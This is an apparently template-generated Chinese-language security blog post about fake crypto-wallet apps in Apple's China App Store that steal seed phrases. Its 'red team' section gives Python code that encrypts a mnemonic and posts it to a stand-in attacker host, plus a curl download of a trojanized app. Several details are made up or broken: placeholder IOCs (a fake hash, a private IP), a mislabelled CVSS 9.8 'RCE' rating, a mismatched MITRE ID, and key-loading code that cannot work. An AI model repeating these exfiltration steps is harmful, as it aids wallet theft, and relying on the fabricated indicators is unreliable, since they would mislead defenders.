---
layout: post
title:  "China's Apple App Store infiltrated by crypto-stealing wallet apps"
date:   2026-04-21 01:58:32 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Apple App Store 中的加密貨幣錢包惡意應用
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak (資訊洩露)
> * **關鍵技術**: `Typosquatting`, `Fake Branding`, `iOS Provisioning Profiles`, `RSA` 和 `Base64` 加密

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意應用使用 `Typosquatting` 和 `Fake Branding` 技術來模擬官方加密貨幣錢包應用，例如 Metamask, Coinbase, Trust Wallet, 和 OneKey。這些應用被上傳到 Apple App Store，並且通過了審核。
* **攻擊流程圖解**: 
  1. 用戶下載惡意應用
  2. 惡意應用重定向用戶到假的加密貨幣錢包網站
  3. 假的加密貨幣錢包網站要求用戶下載 Trojanized 應用
  4. Trojanized 應用使用 iOS Provisioning Profiles 技術來 sideload 惡意代碼
  5. 惡意代碼攔截用戶的助記詞（Mnemonic Phrases）並加密它們使用 RSA 和 Base64
  6. 加密的助記詞被發送到攻擊者的伺服器
* **受影響元件**: Apple App Store, iOS, 加密貨幣錢包應用

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 Apple Developer 帳戶和一個有效的 iOS Provisioning Profile
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    import base64
    import rsa
    
    # 假的加密貨幣錢包網站
    fake_website = "https://example.com"
    
    # 用戶的助記詞
    mnemonic_phrase = "your_mnemonic_phrase"
    
    # 加密助記詞
    encrypted_mnemonic_phrase = rsa.encrypt(mnemonic_phrase.encode(), rsa.PublicKey.load_pkcs1(fake_website + "/public_key"))
    
    # 發送加密的助記詞到攻擊者的伺服器
    requests.post(fake_website + "/upload", data={"encrypted_mnemonic_phrase": base64.b64encode(encrypted_mnemonic_phrase)})
    
    ```
  *範例指令*: 使用 `curl` 命令來下載 Trojanized 應用

```

bash
curl -o trojanized_app.ipa https://example.com/trojanized_app.ipa

```
* **繞過技術**: 攻擊者可以使用 `Typosquatting` 和 `Fake Branding` 技術來繞過 Apple App Store 的審核

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /var/mobile/Applications/trojanized_app.ipa |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule fake_wallet_app {
      meta:
        description = "偵測假的加密貨幣錢包應用"
        author = "Your Name"
      strings:
        $a = "https://example.com"
        $b = "trojanized_app.ipa"
      condition:
        $a and $b
    }
    
    ```
  或者是具體的 **SIEM 查詢語法** (Splunk/Elastic)

```

sql
index=app_store_logs (app_name="fake_wallet_app" AND url="https://example.com")

```
* **緩解措施**: 使用 Apple App Store 的審核功能來檢查應用的合法性，並且使用 iOS 的安全功能來防止 sideload 惡意代碼

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Typosquatting (域名欺騙)**: 惡意者註冊一個與合法域名類似的域名，以便欺騙用戶
* **Fake Branding (偽造品牌)**: 惡意者使用合法品牌的名稱和標誌來欺騙用戶
* **iOS Provisioning Profiles (iOS 配置檔)**: 一種用於配置和管理 iOS 應用的檔案
* **RSA ( Rivest-Shamir-Adleman)**: 一種公鑰加密演算法
* **Base64 (基於 64 位元的編碼)**: 一種用於編碼二進制數據的編碼方案

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/chinas-apple-app-store-infiltrated-by-crypto-stealing-wallet-apps/)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


